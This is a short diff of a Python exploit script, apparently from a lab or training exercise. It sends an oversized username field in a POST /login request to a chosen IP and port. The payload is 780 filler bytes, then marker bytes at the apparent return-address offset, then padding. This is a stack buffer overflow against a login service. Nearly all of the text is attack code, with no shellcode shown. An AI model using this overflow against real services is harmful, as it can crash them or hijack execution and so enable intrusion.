@@ -55,10 +55,13 @@ if (len(ip_address)<=0) or (len(port_number)<=0):
         print("Issues with the user input")
 elif (len(ip_address)>0) and (len(port_number)>0):
     print("*********************************************")
-    size=b"A" * 780 + b"B" * 4 + b"C" * 4 + b"D" * (1200-780-4)
+    size=900
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip_address, int(port_number)))
-    buff=b"username=" +  size + b"&password=A"
+
+    size=b"A" * 780 + b"B" * 4 + b"C" * 4 + b"D" *(1200-4-4-780)
+
+    buff=b"username=" + size + b"&password=A"
 
     buffer=b"POST /login HTTP/1.1\r\n"
     buffer+=b"Host: 192.168.100.211\r\n"
